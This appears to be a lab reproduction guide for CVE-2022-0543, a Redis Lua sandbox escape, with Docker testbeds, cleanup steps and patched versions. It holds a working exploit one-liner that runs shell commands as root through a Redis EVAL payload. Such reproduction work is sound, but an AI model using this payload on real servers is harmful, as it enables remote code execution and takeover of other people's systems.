# CVE-2022-0543
It was discovered, that redis, a persistent key-value database, due to a packaging issue, is prone to a (Debian-specific) Lua sandbox escape, which could result in remote code execution.

## Testbed stup
### Vulnerable
```sh
docker run --rm -p 6379:6379 --name rds-vuln -d vulhub/redis:5.0.7
```

### Safe
```sh
docker run --rm -p 6379:6379 --name rds-safe -d redis
```

## Reproduction steps
Test the vulnerability using the following command:
```sh
echo 'eval "local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\", \"r\"); local res = f:read(\"*a\"); f:close(); return res" 0' | nc 127.0.0.1 6379
```

A vulnerable redis instance will return the output of the `id` command, executed as root:
```
$39
uid=0(root) gid=0(root) groups=0(root)
```

while a safe redis instance will return an error similar to the following:
```
-ERR user_script:1: Script attempted to access nonexistent global variable 'package' script: 59383731574f8ef9c055b3f4cf9cca078446f86d, on @user_script:1.
```

## Cleanup
Stop the running containers with the following command

```sh
docker stop rds-vuln rds-safe
```

## Vulnerable versions

- For the oldstable distribution (buster), this problem has been fixed in version `5:5.0.14-1+deb10u2`.
- For the stable distribution (bullseye), this problem has been fixed in version `5:6.0.16-1+deb11u2`.

## Reference
- https://www.cve.org/CVERecord?id=CVE-2022-0543
- https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543
- https://lists.debian.org/debian-security-announce/2022/msg00048.html